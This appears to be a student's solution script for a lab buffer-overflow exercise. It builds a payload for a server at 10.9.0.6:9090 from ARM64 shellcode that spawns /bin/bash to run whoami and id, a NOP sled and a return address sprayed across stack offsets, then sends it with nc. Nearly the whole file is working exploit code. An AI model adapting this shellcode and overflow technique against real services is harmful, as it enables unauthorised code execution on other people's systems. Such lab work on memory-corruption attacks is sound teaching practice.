#!/usr/bin/python3
"""
Task 3: Level-2 Attack
Target: 10.9.0.6:9090 (80-byte buffer, no frame pointer hint)
Strategy: NOP sled + spray return address across possible offsets
"""

import sys

# Shellcode
shellcode = (
    "\x0b\x05\x01\x10\x0c\x04\x84\xd2\x73\x01\x0c\xcb\x29\x01\x09\x4a"
    "\x28\x01\x80\xd2\x69\x6a\x28\x38\x88\x01\x80\xd2\x69\x6a\x28\x38"
    "\xe8\x09\x80\xd2\x69\x6a\x28\x38\x08\x0a\x80\xd2\xe9\x03\x13\xaa"
    "\x69\x6a\x28\xf8\x08\x0b\x80\xd2\x49\x01\x80\xd2\xe9\x03\x09\xcb"
    "\x69\x02\x09\xcb\x69\x6a\x28\xf8\x08\x0c\x80\xd2\x09\x02\x80\xd2"
    "\xe9\x03\x09\xcb\x69\x02\x09\xcb\x69\x6a\x28\xf8\x08\x0d\x80\xd2"
    "\x29\x01\x09\xca\x69\x6a\x28\xf8\xe0\x03\x13\xaa\x61\x42\x01\xb1"
    "\x94\x02\x14\xca\xe2\x03\x14\xaa\xa8\x1b\x80\xd2\xe1\x66\x02\xd4"
    "/bin/bash*"
    "-c****"
    "echo '=== LEVEL 2 PWNED ==='; /bin/whoami; /bin/id             *"
    "AAAAAAAA"
    "BBBBBBBB"
    "CCCCCCCC"
    "DDDDDDDD"
).encode('latin-1')

# Fill with NOPs
nop = (0xD503201F).to_bytes(4, byteorder='little')
content = bytearray(517)
for offset in range(int(517/4)):
    content[offset*4:offset*4 + 4] = nop

# Place shellcode at start
content[0:len(shellcode)] = shellcode

# ===== UPDATE THIS VALUE =====
# Run: echo hello | nc 10.9.0.6 9090
buffer_addr = 0x0000fffffffff3d0      # ‚Üê UPDATE from server output
# ==============================

# Target address: point to middle of NOP sled (after shellcode)
ret = buffer_addr + 250  # Safe landing in NOP sled

# Spray return address across possible frame pointer locations
# Buffer size is 100-200 bytes, so return address is somewhere in that range
# Frame pointer + 8 = return address
# We'll write return address every 8 bytes in the range [100, 300]
for offset in range(100, 300, 8):
    if offset + 8 <= len(content):
        content[offset:offset + 8] = ret.to_bytes(8, byteorder='little')

# Save payload
with open('badfile', 'wb') as f:
    f.write(content)

print(f"Payload generated: badfile ({len(content)} bytes)")
print(f"Buffer address: {hex(buffer_addr)}")
print(f"Return address: {hex(ret)} (buffer + 250)")
print(f"Return addr sprayed across offsets 100-300")
print("\nSend with: cat badfile | nc 10.9.0.6 9090")
